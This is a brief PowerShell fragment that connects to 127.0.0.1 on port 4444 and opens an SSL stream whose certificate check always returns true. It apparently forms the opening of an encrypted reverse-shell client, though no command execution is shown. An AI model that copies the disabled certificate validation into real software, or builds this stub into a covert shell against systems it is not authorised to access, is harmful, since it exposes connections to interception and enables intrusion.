$szSrvIP = "127.0.0.1"
$nSrvPort = 4444

$tcpClient = [System.Net.Sockets.TcpClient]::new()
$tcpClient.Connect($szSrvIP, $nSrvPort)

$sslStream = [System.Net.Security.SslStream]::new($tcpClient.GetStream(), $false, { param($sender, $cert, $chain, $errors) return $true } )

$sslStream.AuthenticateAsClient($szSrvIP)